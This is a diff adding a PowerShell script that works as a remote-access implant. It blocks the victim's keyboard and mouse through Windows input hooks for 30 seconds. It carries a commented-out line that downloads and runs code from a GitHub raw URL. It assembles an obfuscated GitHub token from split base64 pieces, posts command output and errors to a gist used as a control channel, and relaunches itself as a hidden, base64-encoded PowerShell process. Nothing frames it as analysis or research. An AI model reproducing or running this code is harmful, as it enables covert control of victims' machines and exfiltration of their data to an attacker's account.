@@ -1,0 +1,54 @@
+$scripte123321 = {
+    $scripte1233212 = & {
+    #put code here 
+    
+    Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S(); Start-Sleep -Seconds 30;[H]::U();
+    #iex (iwr 'https://raw.githubusercontent.com/Desnyt628/download/refs/heads/main/lol').content
+    #ipconfig
+    }
+    
+    $part1="nNaMk9kcUVXcFZhQkFnWDJLQTBqRA=="
+    $part2="Z2hwX3JHRVpGYXpUODVhdVdXa"
+    $base64String = $part2 + $part1
+    $byteArray = [System.Convert]::FromBase64String($base64String)
+    $decodedString = [System.Text.Encoding]::UTF8.GetString($byteArray)|Out-String
+    $token = $decodedString
+    $gistId = "2fc80338878064cc5678bfe970de3391"
+    $fileName = "viewer" #inputfile
+    $outPut ="outPut"#outputfile
+
+    $result=$null#useless but security
+    $resultclean=$null
+     #execute the remote code
+        $result="OUTPUT :`r`n"
+        $result += $scripte1233212 |out-string
+        $result += "`r`nERROR :`r`n"
+        $result += $Error[0..($newerror-1)] | out-string
+        $pattern = '[^a-zA-Z0-9!#$%^&*()_+=\-\[\]\{\}\\ |;:\",.<>/?`~]'
+        $resultclean+= $result  -replace "`r`n", '1.2q' -replace '\s+', ' ' -replace $pattern, '?' -replace '1.2q',"`r`n"
+
+
+
+        $updateData = @{
+            #description = "Updated description for the Gist"
+            files = @{
+                "$outPut" = @{
+                    content = "$resultclean"}}}
+
+        # Convert the data to JSON format
+        $jsonData = $updateData | ConvertTo-Json -Depth 3
+        # Define the GitHub Gist API URL for updating a Gist
+        $updateApiUrl = "https://api.github.com/gists/$gistId"
+
+        # Make the API request to update the Gist
+        $response = Invoke-RestMethod -Uri $updateApiUrl -Method Patch -Headers @{
+            Authorization = "token $token"
+        } -Body $jsonData -ContentType "application/json"
+
+        # Output the URL of the updated Gist
+        Write-Output "Gist updated successfully: $($response.html_url)"
+
+}
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($scripte123321)
+$encodedScript = [Convert]::ToBase64String($bytes)
+Start-Process powershell -ArgumentList "-EncodedCommand $encodedScript" -WindowStyle Hidden
